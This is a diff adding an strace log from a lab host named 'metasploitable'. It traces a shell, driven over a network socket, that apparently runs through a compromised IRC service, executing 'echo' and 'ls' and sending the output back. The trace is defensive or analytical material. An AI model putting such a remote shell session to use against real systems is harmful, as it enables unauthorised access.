+[pid  4975] 15:03:29.061660 send(5, "sh: line 3: Escape: command not "..., 39, 0) = 39
+[pid  4975] 15:03:29.061681 select(6, [0 5], [], [5], {0, 0}) = 0 (Timeout)
+[pid  4975] 15:03:29.061698 select(6, [0 5], [], [5], NULL <unfinished ...>
+[pid  4974] 15:03:29.077907 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4974] 15:03:29.077972 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  4974] 15:03:29.077992 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 4978
+[pid  4974] 15:03:29.078013 waitpid(-1, 0xbffb9db8, WNOHANG) = -1 ECHILD (No child processes)
+[pid  4974] 15:03:29.078024 sigreturn() = ? (mask now [])
+[pid  4974] 15:03:29.078064 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4974] 15:03:29.078082 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4974] 15:03:29.078095 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4974] 15:03:29.078111 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:29.078132 rt_sigaction(SIGINT, {SIG_IGN}, {0x807f150, [], 0}, 8) = 0
+[pid  4974] 15:03:29.078155 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4974] 15:03:29.078168 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:29.078189 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4974] 15:03:29.078203 read(0,  <unfinished ...>
+[pid  4972] 15:03:29.245492 <... select resumed> ) = 1 (in [5])
+[pid  4975] 15:03:29.245537 <... select resumed> ) = 1 (in [5])
+[pid  4972] 15:03:29.245571 recv(5,  <unfinished ...>
+[pid  4975] 15:03:29.245583 recv(5,  <unfinished ...>
+[pid  4972] 15:03:29.245594 <... recv resumed> "echo LIp402kd85HbaKCk;\n", 8191, 0) = 23
+[pid  4975] 15:03:29.245607 <... recv resumed> "echo LIp402kd85HbaKCk;\n", 8191, 0) = 23
+[pid  4972] 15:03:29.245629 select(6, [0 5], [1], [5], {0, 0} <unfinished ...>
+[pid  4975] 15:03:29.245643 select(6, [0 5], [1], [5], {0, 0} <unfinished ...>
+[pid  4972] 15:03:29.245658 <... select resumed> ) = 1 (out [1], left {0, 0})
+[pid  4975] 15:03:29.245669 <... select resumed> ) = 1 (out [1], left {0, 0})
+[pid  4972] 15:03:29.245683 write(1, "echo LIp402kd85HbaKCk;\n", 23 <unfinished ...>
+[pid  4975] 15:03:29.245696 write(1, "echo LIp402kd85HbaKCk;\n", 23 <unfinished ...>
+[pid  4974] 15:03:29.245714 <... read resumed> "e", 1) = 1
+[pid  4972] 15:03:29.245721 <... write resumed> ) = 23
+[pid  4975] 15:03:29.245725 <... write resumed> ) = 23
+[pid  4974] 15:03:29.245736 read(0,  <unfinished ...>
+[pid  4972] 15:03:29.245742 select(6, [0 5], [], [5], {0, 0} <unfinished ...>
+[pid  4975] 15:03:29.245755 select(6, [0 5], [], [5], {0, 0} <unfinished ...>
+[pid  4974] 15:03:29.245770 <... read resumed> "c", 1) = 1
+[pid  4972] 15:03:29.245776 <... select resumed> ) = 0 (Timeout)
+[pid  4975] 15:03:29.245781 <... select resumed> ) = 0 (Timeout)
+[pid  4974] 15:03:29.245789 read(0,  <unfinished ...>
+[pid  4972] 15:03:29.245795 select(6, [0 5], [], [5], NULL <unfinished ...>
+[pid  4975] 15:03:29.245805 select(6, [0 5], [], [5], NULL <unfinished ...>
+[pid  4974] 15:03:29.245818 <... read resumed> "h", 1) = 1
+[pid  4974] 15:03:29.245826 read(0, "o", 1) = 1
+[pid  4974] 15:03:29.245838 read(0, " ", 1) = 1
+[pid  4974] 15:03:29.245850 read(0, "L", 1) = 1
+[pid  4974] 15:03:29.245861 read(0, "I", 1) = 1
+[pid  4974] 15:03:29.245873 read(0, "p", 1) = 1
+[pid  4974] 15:03:29.245884 read(0, "4", 1) = 1
+[pid  4974] 15:03:29.245896 read(0, "0", 1) = 1
+[pid  4974] 15:03:29.245908 read(0, "2", 1) = 1
+[pid  4974] 15:03:29.245920 read(0, "k", 1) = 1
+[pid  4974] 15:03:29.245931 read(0, "d", 1) = 1
+[pid  4974] 15:03:29.245943 read(0, "8", 1) = 1
+[pid  4974] 15:03:29.245954 read(0, "5", 1) = 1
+[pid  4974] 15:03:29.245966 read(0, "H", 1) = 1
+[pid  4974] 15:03:29.245978 read(0, "b", 1) = 1
+[pid  4974] 15:03:29.245989 read(0, "a", 1) = 1
+[pid  4974] 15:03:29.246001 read(0, "K", 1) = 1
+[pid  4974] 15:03:29.246012 read(0, "C", 1) = 1
+[pid  4974] 15:03:29.246024 read(0, "k", 1) = 1
+[pid  4974] 15:03:29.246036 read(0, ";", 1) = 1
+[pid  4974] 15:03:29.246047 read(0, "\n", 1) = 1
+[pid  4974] 15:03:29.246096 write(1, "LIp402kd85HbaKCk\n", 17 <unfinished ...>
+[pid  4975] 15:03:29.246112 <... select resumed> ) = 1 (in [0])
+[pid  4974] 15:03:29.246118 <... write resumed> ) = 17
+[pid  4975] 15:03:29.246132 read(0,  <unfinished ...>
+[pid  4974] 15:03:29.246138 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
+[pid  4975] 15:03:29.246147 <... read resumed> "LIp402kd85HbaKCk\n", 8075) = 17
+[pid  4974] 15:03:29.246157 <... rt_sigprocmask resumed> [], 8) = 0
+[pid  4975] 15:03:29.246170 select(6, [0 5], [5], [5], {0, 0} <unfinished ...>
+[pid  4974] 15:03:29.246182 read(0,  <unfinished ...>
+[pid  4975] 15:03:29.246190 <... select resumed> ) = 1 (out [5], left {0, 0})
+[pid  4975] 15:03:29.246206 send(5, "LIp402kd85HbaKCk\r\n", 18, 0) = 18
+[pid  4975] 15:03:29.246221 select(6, [0 5], [], [5], {0, 0}) = 0 (Timeout)
+[pid  4975] 15:03:29.246221 select(6, [0 5], [], [5], NULL <unfinished ...>
+[pid  4618] 15:03:29.967090 <... select resumed> ) = 0 (Timeout)
+[pid  4618] 15:03:29.967115 clock_gettime(CLOCK_MONOTONIC, {2535, 430114377}) = 0
+[pid  4618] 15:03:29.967142 gettimeofday({1478462609, 967147}, NULL) = 0
+[pid  4618] 15:03:29.967159 select(1024, [2 3 4], [], NULL, {1, 0}) = 1 (in [4], left {0, 280000})
+[pid  4618] 15:03:30.695141 clock_gettime(CLOCK_MONOTONIC, {2536, 158149543}) = 0
+[pid  4618] 15:03:30.695174 recv(4, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
+[pid  4618] 15:03:30.695198 getsockopt(4, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
+[pid  4618] 15:03:30.695232 send(4, "ERROR :Closing Link: [192.168.56"..., 64, 0) = -1 EPIPE (Broken pipe)
+[pid  4618] 15:03:30.695256 --- SIGPIPE (Broken pipe) @ 0 (0) ---
+[pid  4618] 15:03:30.695292 close(4)    = 0
+[pid  4618] 15:03:30.695307 time(NULL)  = 1478462610
+[pid  4618] 15:03:30.695319 time(NULL)  = 1478462610
+[pid  4618] 15:03:30.695334 gettimeofday({1478462610, 695339}, NULL) = 0
+[pid  4618] 15:03:30.695350 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+[pid  4618] 15:03:30.695431 clock_gettime(CLOCK_MONOTONIC, {2536, 158428275}) = 0
+[pid  4618] 15:03:30.695445 gettimeofday({1478462610, 695449}, NULL) = 0
+[pid  4618] 15:03:30.695459 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+[pid  4618] 15:03:31.687098 clock_gettime(CLOCK_MONOTONIC, {2537, 150107695}) = 0
+[pid  4618] 15:03:31.687132 gettimeofday({1478462611, 687137}, NULL) = 0
+[pid  4618] 15:03:31.687148 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+[pid  4618] 15:03:32.687099 clock_gettime(CLOCK_MONOTONIC, {2538, 150108920}) = 0
+[pid  4618] 15:03:32.687131 time(NULL)  = 1478462612
+[pid  4618] 15:03:32.687144 time(NULL)  = 1478462612
+[pid  4618] 15:03:32.687159 gettimeofday({1478462612, 687164}, NULL) = 0
+[pid  4618] 15:03:32.687175 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+[pid  4618] 15:03:32.687257 clock_gettime(CLOCK_MONOTONIC, {2538, 150253997}) = 0
+[pid  4618] 15:03:32.687270 gettimeofday({1478462612, 687275}, NULL) = 0
+[pid  4618] 15:03:32.687284 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+[pid  4618] 15:03:33.687099 clock_gettime(CLOCK_MONOTONIC, {2539, 150108462}) = 0
+[pid  4618] 15:03:33.687133 gettimeofday({1478462613, 687138}, NULL) = 0
+[pid  4618] 15:03:33.687150 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+[pid  4618] 15:03:34.687107 clock_gettime(CLOCK_MONOTONIC, {2540, 150116345}) = 0
+[pid  4618] 15:03:34.687138 time(NULL)  = 1478462614
+[pid  4618] 15:03:34.687151 time(NULL)  = 1478462614
+[pid  4618] 15:03:34.687171 gettimeofday({1478462614, 687176}, NULL) = 0
+[pid  4618] 15:03:34.687187 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+[pid  4618] 15:03:34.687269 clock_gettime(CLOCK_MONOTONIC, {2540, 150266179}) = 0
+[pid  4618] 15:03:34.687282 gettimeofday({1478462614, 687287}, NULL) = 0
+[pid  4618] 15:03:34.687296 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+[pid  4618] 15:03:35.687100 clock_gettime(CLOCK_MONOTONIC, {2541, 150110054}) = 0
+[pid  4618] 15:03:35.687135 gettimeofday({1478462615, 687140}, NULL) = 0
+[pid  4618] 15:03:35.687151 select(1024, [2 3], [], NULL, {1, 0} <unfinished ...>
+[pid  4972] 15:03:36.102313 <... select resumed> ) = 1 (in [5])
+[pid  4972] 15:03:36.102349 recv(5, "ls\n", 8169, 0) = 3
+[pid  4972] 15:03:36.102372 select(6, [0 5], [1], [5], {0, 0}) = 1 (out [1], left {0, 0})
+[pid  4972] 15:03:36.102400 write(1, "ls\n", 3 <unfinished ...>
+[pid  4974] 15:03:36.102416 <... read resumed> "l", 1) = 1
+[pid  4972] 15:03:36.102424 <... write resumed> ) = 3
+[pid  4974] 15:03:36.102435 read(0,  <unfinished ...>
+[pid  4972] 15:03:36.102442 select(6, [0 5], [], [5], {0, 0} <unfinished ...>
+[pid  4974] 15:03:36.102459 <... read resumed> "s", 1) = 1
+[pid  4972] 15:03:36.102466 <... select resumed> ) = 0 (Timeout)
+[pid  4974] 15:03:36.102474 read(0,  <unfinished ...>
+[pid  4972] 15:03:36.102481 select(6, [0 5], [], [5], NULL <unfinished ...>
+[pid  4974] 15:03:36.102495 <... read resumed> "\n", 1) = 1
+[pid  4974] 15:03:36.102523 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4974] 15:03:36.102566 stat64("/sbin/ls", 0xbffba138) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:36.102586 stat64("/bin/ls", {st_mode=S_IFREG|0755, st_size=92376, ...}) = 0
+[pid  4974] 15:03:36.102626 stat64("/bin/ls", {st_mode=S_IFREG|0755, st_size=92376, ...}) = 0
+[pid  4974] 15:03:36.102674 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+[pid  4974] 15:03:36.102696 clone(Process 4980 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d566f8) = 4980
+[pid  4980] 15:03:36.102786 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4980] 15:03:36.102812 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4980] 15:03:36.102836 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4980] 15:03:36.102857 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4980] 15:03:36.102886 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4980] 15:03:36.102914 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4980] 15:03:36.102936 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  4980] 15:03:36.103009 execve("/bin/ls", ["ls"], [/* 14 vars */]) = 0
+[pid  4980] 15:03:36.103137 brk(0)      = 0x805f000
+[pid  4980] 15:03:36.103167 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4980] 15:03:36.103187 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7efd000
+[pid  4980] 15:03:36.103204 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  4980] 15:03:36.103227 open("/etc/ld.so.cache", O_RDONLY) = 5
+[pid  4980] 15:03:36.103244 fstat64(5, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4980] 15:03:36.103277 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 5, 0) = 0xb7ef5000
+[pid  4980] 15:03:36.103288 close(5)    = 0
+[pid  4980] 15:03:36.103301 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4980] 15:03:36.103325 open("/lib/tls/i686/cmov/librt.so.1", O_RDONLY) = 5
+[pid  4980] 15:03:36.103346 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\220\31"..., 512) = 512
+[pid  4980] 15:03:36.103371 fstat64(5, {st_mode=S_IFREG|0644, st_size=30624, ...}) = 0
+[pid  4980] 15:03:36.103404 mmap2(NULL, 33360, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7eec000
+[pid  4980] 15:03:36.103417 mmap2(0xb7ef3000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x6) = 0xb7ef3000
+[pid  4980] 15:03:36.103438 close(5)    = 0
+[pid  4980] 15:03:36.103450 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4980] 15:03:36.103467 open("/lib/libselinux.so.1", O_RDONLY) = 5
+[pid  4980] 15:03:36.103484 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300@\0"..., 512) = 512
+[pid  4980] 15:03:36.103506 fstat64(5, {st_mode=S_IFREG|0644, st_size=95948, ...}) = 0
+[pid  4980] 15:03:36.103540 mmap2(NULL, 101180, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7ed3000
+[pid  4980] 15:03:36.103552 mmap2(0xb7eea000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x16) = 0xb7eea000
+[pid  4980] 15:03:36.103571 close(5)    = 0
+[pid  4980] 15:03:36.103585 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4980] 15:03:36.103604 open("/lib/libacl.so.1", O_RDONLY) = 5
+[pid  4980] 15:03:36.103621 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\25\0"..., 512) = 512
+[pid  4980] 15:03:36.103642 fstat64(5, {st_mode=S_IFREG|0644, st_size=22544, ...}) = 0
+[pid  4980] 15:03:36.103674 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ed2000
+[pid  4980] 15:03:36.103688 mmap2(NULL, 25344, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7ecb000
+[pid  4980] 15:03:36.103699 mmap2(0xb7ed1000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x5) = 0xb7ed1000
+[pid  4980] 15:03:36.103715 close(5)    = 0
+[pid  4980] 15:03:36.103727 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4980] 15:03:36.103744 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 5
+[pid  4980] 15:03:36.103763 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  4980] 15:03:36.103784 fstat64(5, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  4980] 15:03:36.103816 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d7c000
+[pid  4980] 15:03:36.103828 mmap2(0xb7ec5000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x149) = 0xb7ec5000
+[pid  4980] 15:03:36.103845 mmap2(0xb7ec8000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ec8000
+[pid  4980] 15:03:36.103861 close(5)    = 0
+[pid  4980] 15:03:36.103876 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4980] 15:03:36.103893 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 5
+[pid  4980] 15:03:36.103915 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\000"..., 512) = 512
+[pid  4980] 15:03:36.103936 fstat64(5, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
+[pid  4980] 15:03:36.103968 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d64000
+[pid  4980] 15:03:36.103980 mmap2(0xb7d78000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x13) = 0xb7d78000
+[pid  4980] 15:03:36.103996 mmap2(0xb7d7a000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d7a000
+[pid  4980] 15:03:36.104013 close(5)    = 0
+[pid  4980] 15:03:36.104026 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4980] 15:03:36.104043 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 5
+[pid  4980] 15:03:36.104063 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\000"..., 512) = 512
+[pid  4980] 15:03:36.104084 fstat64(5, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+[pid  4980] 15:03:36.104116 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d60000
+[pid  4980] 15:03:36.104128 mmap2(0xb7d62000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x1) = 0xb7d62000
+[pid  4980] 15:03:36.104147 close(5)    = 0
+[pid  4980] 15:03:36.104160 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4980] 15:03:36.104177 open("/lib/libattr.so.1", O_RDONLY) = 5
+[pid  4980] 15:03:36.104193 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\320\f\0"..., 512) = 512
+[pid  4980] 15:03:36.104213 fstat64(5, {st_mode=S_IFREG|0644, st_size=13592, ...}) = 0
+[pid  4980] 15:03:36.104246 mmap2(NULL, 16372, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d5c000
+[pid  4980] 15:03:36.104257 mmap2(0xb7d5f000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x2) = 0xb7d5f000
+[pid  4980] 15:03:36.104273 close(5)    = 0
+[pid  4980] 15:03:36.104297 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d5b000
+[pid  4980] 15:03:36.104318 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d5a000
+[pid  4980] 15:03:36.104331 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d5a720, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  4980] 15:03:36.104419 mprotect(0xb7ec5000, 4096, PROT_READ) = 0
+[pid  4980] 15:03:36.104449 munmap(0xb7ef5000, 29338) = 0
+[pid  4980] 15:03:36.104465 set_tid_address(0xb7d5a768) = 4980
+[pid  4980] 15:03:36.104475 set_robust_list(0xb7d5a770, 0xc) = 0
+[pid  4980] 15:03:36.104486 futex(0xbfc211c0, 0x81 /* FUTEX_??? */, 1) = 0
+[pid  4980] 15:03:36.104503 rt_sigaction(SIGRTMIN, {0xb7d682c0, [], SA_SIGINFO}, NULL, 8) = 0
+[pid  4980] 15:03:36.104520 rt_sigaction(SIGRT_1, {0xb7d68340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
+[pid  4980] 15:03:36.104537 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
+[pid  4980] 15:03:36.104553 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
+[pid  4980] 15:03:36.104580 uname({sys="Linux", node="metasploitable", ...}) = 0
+[pid  4980] 15:03:36.104731 brk(0)      = 0x805f000
+[pid  4980] 15:03:36.104741 brk(0x8080000) = 0x8080000
+[pid  4980] 15:03:36.104760 open("/etc/selinux/config", O_RDONLY|O_LARGEFILE) = -1 ENOENT (No such file or directory)
+[pid  4980] 15:03:36.104805 statfs64("/selinux", 84, 0xbfc2014c) = -1 ENOENT (No such file or directory)
+[pid  4980] 15:03:36.104821 open("/proc/mounts", O_RDONLY|O_LARGEFILE) = 5
+[pid  4980] 15:03:36.104859 fstat64(5, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
+[pid  4980] 15:03:36.104894 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7efc000
+[pid  4980] 15:03:36.104908 read(5, "rootfs / rootfs rw 0 0\nnone /sys"..., 1024) = 866
+[pid  4980] 15:03:36.104952 read(5, "", 1024) = 0
+[pid  4980] 15:03:36.104964 close(5)    = 0
+[pid  4980] 15:03:36.104975 munmap(0xb7efc000, 4096) = 0
+[pid  4980] 15:03:36.105021 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc21038) = -1 EINVAL (Invalid argument)
+[pid  4980] 15:03:36.105041 ioctl(1, TIOCGWINSZ, 0xbfc2119c) = -1 EINVAL (Invalid argument)
+[pid  4980] 15:03:36.105070 open(".", O_RDONLY|O_NONBLOCK|O_LARGEFILE|O_DIRECTORY|0x80000) = 5
+[pid  4980] 15:03:36.105083 fstat64(5, {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4980] 15:03:36.105116 fcntl64(5, F_GETFD) = 0x1 (flags FD_CLOEXEC)
+[pid  4980] 15:03:36.105130 getdents64(5, /* 21 entries */, 4096) = 712
+[pid  4980] 15:03:36.105324 getdents64(5, /* 0 entries */, 4096) = 0
+[pid  4980] 15:03:36.105335 close(5)    = 0
+[pid  4980] 15:03:36.105361 fstat64(1, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+[pid  4980] 15:03:36.105395 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7efc000
+[pid  4980] 15:03:36.105417 write(1, "Donation\nLICENSE\naliases\nbadword"..., 223 <unfinished ...>
+[pid  4975] 15:03:36.105437 <... select resumed> ) = 1 (in [0])
+[pid  4980] 15:03:36.105445 <... write resumed> ) = 223
+[pid  4975] 15:03:36.105453 read(0,  <unfinished ...>
+[pid  4980] 15:03:36.105459 close(1 <unfinished ...>
+[pid  4975] 15:03:36.105467 <... read resumed> "Donation\nLICENSE\naliases\nbadword"..., 8058) = 223
+[pid  4980] 15:03:36.105481 <... close resumed> ) = 0
+[pid  4975] 15:03:36.105493 select(6, [0 5], [5], [5], {0, 0} <unfinished ...>
+[pid  4980] 15:03:36.105505 munmap(0xb7efc000, 4096 <unfinished ...>
+[pid  4975] 15:03:36.105516 <... select resumed> ) = 1 (out [5], left {0, 0})
+[pid  4980] 15:03:36.105526 <... munmap resumed> ) = 0
+[pid  4975] 15:03:36.105539 send(5, "Donation\r\nLICENSE\r\naliases\r\nbadw"..., 242, 0 <unfinished ...>
+[pid  4980] 15:03:36.105554 close(2 <unfinished ...>
+[pid  4975] 15:03:36.105638 <... send resumed> ) = 242
+[pid  4980] 15:03:36.105645 <... close resumed> ) = 0
+[pid  4975] 15:03:36.105674 select(6, [0 5], [], [5], {0, 0} <unfinished ...>
+[pid  4980] 15:03:36.105707 exit_group(0) = ?
+Process 4980 detached
+[pid  4975] 15:03:36.105763 <... select resumed> ) = 0 (Timeout)
+[pid  4975] 15:03:36.105771 select(6, [0 5], [], [5], NULL <unfinished ...>
+[pid  4974] 15:03:36.127438 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4974] 15:03:36.127512 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  4974] 15:03:36.127526 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], WNOHANG) = 4980
+[pid  4974] 15:03:36.127559 waitpid(-1, 0xbffb9db8, WNOHANG) = -1 ECHILD (No child processes)
+[pid  4974] 15:03:36.127580 sigreturn() = ? (mask now [])
+[pid  4974] 15:03:36.127622 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4974] 15:03:36.127692 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4974] 15:03:36.127706 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4974] 15:03:36.127735 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:36.127782 rt_sigaction(SIGINT, {SIG_IGN}, {0x807f150, [], 0}, 8) = 0
+[pid  4974] 15:03:36.127809 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4974] 15:03:36.127822 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:36.127856 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4974] 15:03:36.127882 read(0,  <unfinished ...>
+[pid  4618] 15:03:36.687089 <... select resumed> ) = 0 (Timeout)
+[pid  4618] 15:03:36.687115 clock_gettime(CLOCK_MONOTONIC, {2542, 150113879}) = 0
+[pid  4618] 15:03:36.687135 time(NULL)  = 1478462616
+[pid  4618] 15:03:36.687151 time(NULL)  = 1478462616
+[pid  4618] 15:03:36.687167 gettimeofday({1478462616, 687172}, NULL) = 0
+[pid  4618] 15:03:36.687183 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+[pid  4618] 15:03:36.687266 clock_gettime(CLOCK_MONOTONIC, {2542, 150263533}) = 0
+[pid  4618] 15:03:36.687280 gettimeofday({1478462616, 687284}, NULL) = 0
+[pid  4618] 15:03:36.687294 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+[pid  4618] 15:03:37.687099 clock_gettime(CLOCK_MONOTONIC, {2543, 150109517}) = 0
+[pid  4618] 15:03:37.687134 gettimeofday({1478462617, 687140}, NULL) = 0
+[pid  4618] 15:03:37.687151 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+[pid  4618] 15:03:38.687100 clock_gettime(CLOCK_MONOTONIC, {2544, 150110134}) = 0
+[pid  4618] 15:03:38.687132 time(NULL)  = 1478462618
+[pid  4618] 15:03:38.687145 time(NULL)  = 1478462618
+[pid  4618] 15:03:38.687161 gettimeofday({1478462618, 687165}, NULL) = 0
+[pid  4618] 15:03:38.687176 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+[pid  4618] 15:03:38.687258 clock_gettime(CLOCK_MONOTONIC, {2544, 150255374}) = 0
+[pid  4618] 15:03:38.687272 gettimeofday({1478462618, 687276}, NULL) = 0
+[pid  4618] 15:03:38.687286 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+[pid  4618] 15:03:39.687918 clock_gettime(CLOCK_MONOTONIC, {2545, 150927601}) = 0
+[pid  4618] 15:03:39.687952 gettimeofday({1478462619, 687957}, NULL) = 0
+[pid  4618] 15:03:39.687969 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+[pid  4618] 15:03:40.687099 clock_gettime(CLOCK_MONOTONIC, {2546, 150108398}) = 0
+[pid  4618] 15:03:40.687130 time(NULL)  = 1478462620
